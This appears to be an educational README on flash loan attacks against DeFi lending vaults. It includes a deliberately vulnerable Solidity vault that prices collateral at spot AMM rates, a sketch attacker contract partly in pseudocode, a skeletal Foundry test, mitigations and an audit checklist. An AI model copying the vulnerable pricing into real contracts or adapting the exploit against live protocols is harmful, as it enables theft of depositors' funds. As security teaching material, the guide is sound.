
# ⚡ Flash Loan Attack — Beginner-Friendly README

A practical, one-stop guide to understanding **flash loans**, how attackers abuse them, and how to defend your Solidity protocols. This is written to be **copy–paste friendly** with clear PoCs and **Foundry** snippets.

> **Who is this for?** Smart contract devs, auditors, and learners who want a concise, hands-on reference.

---

## 🧠 TL;DR

- A **flash loan** lets you **borrow a large amount of capital with no collateral** as long as you **repay within the same transaction**.
- Attacks leverage the **temporary buying power** to **manipulate prices, state, or invariants** and **profit before the transaction ends**.
- Typical patterns: **Oracle/AMM price manipulation**, **reentrancy (amplified by flash liquidity)**, **liquidation games**, **governance vote power bursts**, and **fee-on-transfer or rounding quirks**.
- **Mitigate** with: **robust oracles (TWAP/median)**, **reentrancy guards**, **proper accounting order**, **caps/ratelimits**, **circuit breakers**, and **economic simulations**.

---

## 📚 Table of Contents

1. [What Is a Flash Loan?](#-what-is-a-flash-loan)
2. [Common Attack Patterns](#-common-attack-patterns)
3. [Minimal Vulnerable Contract](#-minimal-vulnerable-contract)
4. [Attacker PoC (Solidity)](#-attacker-poc-solidity)
5. [Foundry Test (Walkthrough)](#-foundry-test-walkthrough)
6. [Mitigations & Best Practices](#-mitigations--best-practices)
7. [Audit Checklist](#-audit-checklist)
8. [Further Reading](#-further-reading)

---

## 🔍 What Is a Flash Loan?

A **flash loan** is an **uncollateralized loan** that must be **repaid within the same transaction**. If repayment fails, **the entire transaction reverts**, restoring state as if nothing happened. Protocols like Aave and DEXes (via **flash swaps**) enable this primitive.

**Why powerful?** Attackers can momentarily access **tens/hundreds of millions** in liquidity to:
- Move AMM prices drastically.
- Force liquidations at manipulated prices.
- Temporarily gain governance power.
- Exploit subtle ordering and accounting bugs.

---

## 🧩 Common Attack Patterns

1. **Oracle / AMM Price Manipulation**
   - Protocol uses **spot price** from a single AMM pool.
   - Attacker uses a flash loan to buy/sell and **swing the price** for one block, then borrows/repays from the victim at the fake price.

2. **Reentrancy with Flash Liquidity**
   - Flash loan boosts capital to **reenter** functions (if reentrancy is possible) to drain funds faster.

3. **Governance Power Inflation**
   - Borrow governance token (or mint via leveraged swaps), take snapshots/vote, revert price, **keep governance decision**.

4. **Sandwiching / Liquidation Games**
   - Temporarily **force unhealthy positions** or snipe liquidation discounts.

5. **Accounting & Fee Edge Cases**
   - Exploit **fee-on-transfer** tokens, rounding, or **incorrect order of state updates**.

---

## 🧪 Minimal Vulnerable Contract

This example shows a vault that **uses an AMM spot price** to value collateral, making it **manipulable within a single tx**.

> **Note:** This is an illustrative minimalism. Real-world AMMs and oracles are more involved.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function totalSupply() external view returns (uint);
    function balanceOf(address account) external view returns (uint);
    function transfer(address to, uint amount) external returns (bool);
    function transferFrom(address from, address to, uint amount) external returns (bool);
    function approve(address spender, uint amount) external returns (bool);
    function decimals() external view returns (uint8);
}

/// @notice Minimal AMM-like interface exposing reserves; think UniswapV2Pair-style.
interface ISpotPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function token1() external view returns (address);
}

/// @notice Vulnerable lending vault valuing collateral via raw spot price from a single AMM pair.
contract VulnerableVault {
    IERC20 public immutable collatToken; // e.g., VOLT
    IERC20 public immutable debtToken;   // e.g., USDC
    ISpotPair public immutable pair;     // VOLT/USDC pair

    mapping(address => uint256) public collateral; // in VOLT
    mapping(address => uint256) public debt;       // in USDC

    uint256 public constant LTV_BPS = 70_00; // 70% LTV in basis points

    constructor(IERC20 _collatToken, IERC20 _debtToken, ISpotPair _pair) {
        collatToken = _collatToken;
        debtToken = _debtToken;
        pair = _pair;
    }

    function deposit(uint256 amount) external {
        require(collatToken.transferFrom(msg.sender, address(this), amount), "transfer fail");
        collateral[msg.sender] += amount;
    }

    function _spotPriceCollateralInDebt() internal view returns (uint256 price) {
        // price = reserveDebt / reserveCollat (scaled by decimals). Super naive spot fetch.
        (uint112 r0, uint112 r1,) = pair.getReserves();
        if (pair.token0() == address(collatToken)) {
            require(r0 > 0 && r1 > 0, "empty reserves");
            price = (uint256(r1) * 1e18) / uint256(r0);
        } else {
            require(r0 > 0 && r1 > 0, "empty reserves");
            price = (uint256(r0) * 1e18) / uint256(r1);
        }
    }

    function borrow(uint256 amountDebt) external {
        // Compute credit based on *current spot price*
        uint256 price = _spotPriceCollateralInDebt(); // manipulable
        uint256 collatValue = (collateral[msg.sender] * price) / 1e18;
        uint256 maxDebt = (collatValue * LTV_BPS) / 10_000;
        require(debt[msg.sender] + amountDebt <= maxDebt, "exceeds LTV");
        require(debtToken.transfer(msg.sender, amountDebt), "debt transfer fail");
        debt[msg.sender] += amountDebt;
    }

    function repay(uint256 amountDebt) external {
        require(debtToken.transferFrom(msg.sender, address(this), amountDebt), "transfer fail");
        debt[msg.sender] -= amountDebt;
    }
}
```

### 🚨 Why is this vulnerable?

- The vault trusts **instantaneous spot price** from a **single AMM pair**.
- An attacker can use a **flash loan** to **temporarily pump** the price of `collatToken`, then **borrow inflated `debtToken`**, and finally revert the price and repay the flash loan—**keeping the profit**.

---

## 🧨 Attacker PoC (Solidity)

This PoC sketches an attacker who obtains a flash loan (from any provider / flash swap), **manipulates the AMM**, borrows, and unwinds.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IFlashProvider {
    function flashLoan(uint256 amount, bytes calldata data) external;
}

interface IAMM {
    function swap(uint amountIn, bool zeroForOne, address to, bytes calldata data) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
}

interface IVault {
    function deposit(uint256 amount) external;
    function borrow(uint256 amountDebt) external;
}

interface IERC20Like {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FlashLoanAttacker {
    IFlashProvider public provider;
    IAMM public amm;
    IVault public vault;
    IERC20Like public collat;
    IERC20Like public debt;

    constructor(IFlashProvider _provider, IAMM _amm, IVault _vault, IERC20Like _collat, IERC20Like _debt) {
        provider = _provider;
        amm = _amm;
        vault = _vault;
        collat = _collat;
        debt = _debt;
    }

    /// @notice Entry point: borrow huge amount of DEBT to swing AMM and fake price for 1 tx.
    function attack(uint256 flashAmount, uint256 borrowDebt) external {
        provider.flashLoan(flashAmount, abi.encode(borrowDebt));
    }

    /// @notice Flash callback invoked by provider *within the same tx*.
    function onFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == address(provider), "only provider");
        uint256 borrowDebt = abi.decode(data, (uint256));

        // 1) Use flash capital to manipulate AMM price (sketch; implementation depends on AMM API).
        // Example idea: buy a large amount of COLLAT with DEBT to push COLLAT/DEBT price up.
        debt.approve(address(amm), type(uint256).max);
        // Pseudocode: amm.swap(amount, /*zeroForOne?*/, address(this), "");
        // After this, spot price of COLLAT in DEBT is artificially high.

        // 2) Deposit manipulated collateral and borrow at inflated valuation.
        collat.approve(address(vault), type(uint256).max);
        uint256 balCollat = collat.balanceOf(address(this));
        if (balCollat > 0) {
            vault.deposit(balCollat);
        }
        vault.borrow(borrowDebt); // vault sends DEBT to attacker

        // 3) Unwind AMM price towards normal and repay flash loan.
        // Sell back COLLAT for DEBT (sketch), then repay provider.
        // amm.swap(...);

        // 4) Repay flash loan; attacker keeps surplus DEBT as profit.
        require(debt.transfer(address(provider), amount), "repay flash fail");
        // Profit: residual DEBT balance on this contract.
    }
}
```

> The AMM swap calls above are **pseudocode**; wire them to your local UniswapV2/UniswapV3 style pair/router in tests to create a fully runnable exploit.

---

## 🧪 Foundry Test (Walkthrough)

Below is a **conceptual test** you can adapt. It sets up: tokens, AMM pair, vault, a simple flash provider, and executes the exploit.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

contract ERC20Mock {
    string public name; string public symbol;
    uint8 public immutable decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s, uint256 supply) {
        name = n; symbol = s;
        _mint(msg.sender, supply);
    }
    function _mint(address to, uint256 amt) internal {
        balanceOf[to] += amt; totalSupply += amt;
    }
    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt; balanceOf[to] += amt; return true;
    }
    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt; return true;
    }
    function transferFrom(address f, address t, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender]; require(a >= amt, "allow");
        allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt; balanceOf[t] += amt; return true;
    }
}

interface IVaultLike {
    function deposit(uint256) external;
    function borrow(uint256) external;
    function repay(uint256) external;
    function collateral(address) external view returns (uint256);
    function debt(address) external view returns (uint256);
}

contract SimpleFlashProvider {
    address public immutable token;
    constructor(address _token) { token = _token; }
    function flashLoan(uint256 amt, bytes calldata data) external {
        // Send funds to borrower
        (bool ok1,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, amt));
        require(ok1, "send fail");
        // callback
        (bool ok2,) = msg.sender.call(abi.encodeWithSignature("onFlashLoan(uint256,bytes)", amt, data));
        require(ok2, "callback fail");
        // Expect repayment
        (bool ok3, bytes memory ret) = token.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        require(ok3, "bal fail");
        uint256 bal = abi.decode(ret, (uint256));
        require(bal >= amt, "not repaid");
    }
}

contract FlashLoanExploitTest is Test {
    ERC20Mock collat; // VOLT
    ERC20Mock debt;   // USDC mock
    IVaultLike vault;
    SimpleFlashProvider provider;

    address attacker = address(0xBEEF);

    function setUp() public {
        collat = new ERC20Mock("Volt", "VOLT", 1_000_000e18);
        debt   = new ERC20Mock("Dollar", "USD",  1_000_000e18);

        // Deploy your AMM + pair with initial reserves here (omitted for brevity).
        // Deploy VulnerableVault with the pair address.
        // vault = new VulnerableVault(...);

        provider = new SimpleFlashProvider(address(debt));

        // Seed contracts and attacker balances, set approvals, etc.
        // deal(address(debt), address(provider), 500_000e18);
        // deal(address(collat), attacker, 10_000e18);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        // 1) Take flash loan (big DEBT)
        // 2) Use DEBT to buy VOLT on AMM, push price up
        // 3) deposit VOLT to vault; borrow inflated DEBT
        // 4) sell back VOLT; repay flash; keep profit
        // 5) assert profit > 0 and vault debt accounted
        vm.stopPrank();

        // Assertions (pseudo):
        // assertGt(debt.balanceOf(attacker), initialAttackerDebtBalance);
    }
}
```

> **Tip:** Instead of mocking the AMM, you can import **Uniswap V2** into your Foundry project and build realistic price manipulation in tests (add liquidity, perform swaps, read reserves).

---

## 🛡 Mitigations & Best Practices

**1) Don’t trust spot price.**
- Use **volume-weighted or time-weighted** oracles (e.g., **TWAP**, UniswapV3 **Oracle**, Chainlink **median**).
- Require **multiple sources** or **circuit breakers** if price moves exceed thresholds.

**2) Defend against reentrancy & ordering traps.**
- Use **checks-effects-interactions** and **`nonReentrant`** guards.
- **Update critical accounting before external calls**.

**3) Cap attack surface.**
- Set **per-tx** and **per-block** **caps** on borrows/mints/redemptions.
- Use **cooldowns** for governance voting power & snapshots.
- Limit **oracle update frequency** and **sensitivity**.

**4) Consider market microstructure.**
- Add **slippage checks** and **max price deviation** tolerances.
- For liquidations, use **robust oracles** and **insurance funds**.

**5) Monitor & react.**
- On-chain monitors for abnormal **price/volume/TVL**.
- **Pause guardians** or **rate limiters** to slow cascading risk.

**6) Simulate economically.**
- Backtest attacks in **Foundry** with realistic **AMM liquidity** and **MEV conditions**.

---

## ✅ Audit Checklist

- [ ] Oracle uses **TWAP/median** rather than single-pool spot price.
- [ ] Cross-checked against **manipulable markets** with low liquidity.
- [ ] **Reentrancy** protection on sensitive flows.
- [ ] **Accounting order** correct (state updates before external calls).
- [ ] **Caps/Rate limits** on mints/borrows/redemptions.
- [ ] **Slippage & price deviation** checks on trades/valuations.
- [ ] **Governance** snapshots & delays resist flash-borrowed voting power.
- [ ] **Unit & invariant tests** simulate flash manipulation scenarios.
- [ ] **Pause/circuit breaker** paths are safe and tested.

---

## 🧰 Quickstart: Foundry Scaffold

```bash
forge init flash-loan-lab
cd flash-loan-lab
forge install OpenZeppelin/openzeppelin-contracts@v5.0.2
# Add UniswapV2 or V3 repos if you want realistic AMM behavior.
forge build
forge test -vv
```

---

## 🔗 Further Reading

- Uniswap v2 & v3 **TWAP/Oracle** docs
- Chainlink **Data Feeds** & **OCR**
- Aave **Flash Loans** & Uniswap **Flash Swaps**
- Post-mortems on price-manipulation incidents (various DeFi protocols)

> **Reminder:** Examples here are educational. Always test with realistic liquidity and MEV assumptions before trusting designs in production.

---

## © License

MIT. Use freely with attribution.
